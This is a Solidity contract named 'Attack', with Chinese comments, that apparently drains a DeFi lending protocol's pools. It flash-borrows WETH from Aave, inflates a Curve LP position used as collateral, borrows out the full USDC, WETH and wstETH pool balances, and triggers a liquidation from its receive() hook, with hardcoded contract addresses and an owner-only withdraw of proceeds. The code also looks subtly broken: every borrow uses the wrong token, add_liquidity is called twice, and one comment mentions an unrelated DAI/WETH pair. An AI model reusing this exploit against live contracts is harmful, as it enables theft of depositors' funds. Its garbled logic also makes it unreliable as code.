// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.0 <0.9.0;

interface IERC20 {
  function totalSupply() external view returns (uint256 _supply);
  function balanceOf(address _owner) external view returns (uint256 _balance);
  function approve(address _spender, uint256 _value) external returns (bool _success);
  function transfer(address _to, uint256 _value) external returns (bool _success);
}
interface IFlashLoanSimpleReceiver {
    /**
    * @notice 在接收闪电借款资产后执行操作
    * @dev 确保合约能够归还债务 + 额外费用，例如，具有
    *      足够的资金来偿还，并已批准 Pool 提取总金额
    * @param asset 闪电借款资产的地址
    * @param amount 闪电借款资产的数量
    * @param premium 闪电借款资产的费用
    * @param initiator 发起闪电贷款的地址
    * @param params 初始化闪电贷款时传递的字节编码参数
    * @return 如果操作的执行成功则返回 True，否则返回 False
    */
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}
interface ILendingPool {
    function flashLoanSimple(
    address receiverAddress,
    address asset,
    uint256 amount,
    bytes calldata params,
    uint16 referralCode
  ) external;
    function deposit(
        address asset,
        uint64 trancheId,
        uint256 amount,
        address onBehalfOf,
        uint16 referralCode
    ) external;
    function borrow(
        address asset,
        uint64 trancheId,
        uint256 amount,
        uint16 referralCode,
        address onBehalfOf
    ) external;
    function liquidationCall(
        address collateralAsset,
        address debtAsset,
        uint64 trancheId,
        address user,
        uint256 debtToCover,
        bool receiveAToken
    ) external;

}
interface Wrapped{
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface CurvePool{
    function add_liquidity(uint[] calldata amounts,uint min) external payable;
    function remove_liquidity(uint amount,uint[] calldata mins) external;
}


interface Oracle {
    function getAssetPrice(address asset)external returns(uint);
}


contract Attack {
    address owner;
    address WETH = 0x4200000000000000000000000000000000000006;
    address wstETH = 0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb;
    address USDC = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address LP_TOKEN = 0xEfDE221f306152971D8e9f181bFe998447975810;

    address AAVE_V3_POOL = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address CURVE_POOL = 0xB90B9B1F91a01Ea22A182CD84C1E22222e39B415;
    address Oracle_ADDRESS = 0xA1F5DDf4A9C4Bc2b1b63A6A4e7707B7afc58f010;

    address VMX_POOL = 0x60F015F66F3647168831d31C7048ca95bb4FeaF9;
    address VMX_USDC_POOL = 0x419fb13b1F22c4E3A364176B237E372cA55dF4a8;
    address VMX_WETH_POOL = 0x7D627406672F712e69080cf9718fb21c30995f09;
    address VMX_WSTETH_POOL = 0xd4e43E0D278De1024355FCD203A1C16E175Ba32E;

    ILendingPool aave;
    CurvePool    curve;
    Oracle       oracle;
    ILendingPool vmx;

    uint colLpAmount;

    constructor() public {
        owner =  msg.sender;
        aave = ILendingPool(AAVE_V3_POOL);
        curve = CurvePool(CURVE_POOL);
        oracle = Oracle(Oracle_ADDRESS);
        vmx = ILendingPool(VMX_POOL);
    }
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    event LogEventName(address param1);
    event Price(uint price);

    function withDraw(address token,uint amount) public onlyOwner{
        IERC20(token).transfer(owner,amount);
    }

    function doAttack() public{
        //falsh loan
        aave.flashLoanSimple(address(this), WETH, 1600*1e18, "", 0);          
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {   
        // 确认调用的是 DAI/WETH pair 合约
        require(msg.sender == AAVE_V3_POOL, "not authorized");
        require(initiator == address(this), "invalid initiator");
        uint wAmount = amount;
        //exchange WETH to ETH
        Wrapped(WETH).withdraw(wAmount);
        uint[] memory amounts = new uint[](2);
        amounts[0] = wAmount; 
        amounts[1] = 0;      
        curve.add_liquidity(amounts, 0);
        //计算需要去抵押的lp数量
        uint lpPrice = getLPPrice();
        colLpAmount  = 10000;
        IERC20(LP_TOKEN).approve(VMX_POOL, colLpAmount);
        vmx.deposit(LP_TOKEN, 1, colLpAmount, address(this), 0);

        uint bUSDCAmount = IERC20(USDC).balanceOf(VMX_USDC_POOL);
        vmx.borrow(asset, 0, bUSDCAmount, 0, address(this));
        uint bWETHAmount = IERC20(WETH).balanceOf(VMX_WETH_POOL);
        vmx.borrow(asset, 0, bWETHAmount, 0, address(this));
        uint bwstWTHAmount = IERC20(wstETH).balanceOf(VMX_WSTETH_POOL);
        vmx.borrow(asset, 0, bwstWTHAmount, 0, address(this));

        //移除流动性
        uint[] memory ramounts = new uint[](2);
        ramounts[0] = 0; 
        ramounts[1] = 0;      
        curve.add_liquidity(amounts, 0);
        curve.remove_liquidity(IERC20(LP_TOKEN).balanceOf(address(this)), ramounts);

        //清算完成继续添加流动性

        
        // 计算flashloan费用
        uint amountToRepay = amount + premium;

        // 归还闪电贷
        IERC20(WETH).approve(AAVE_V3_POOL, amountToRepay);

        return true;
    }

    receive() external payable {
        // 去清算 计算当前抵押的LP价值
        uint nowCol = 1000;
        IERC20(USDC).approve(VMX_POOL, 100000*1e18);
        vmx.liquidationCall(LP_TOKEN, USDC, 0, address(this), nowCol, false); 
    }

    function getLPPrice() internal returns (uint){
        uint price = oracle.getAssetPrice(LP_TOKEN);
        return price;
    }

}
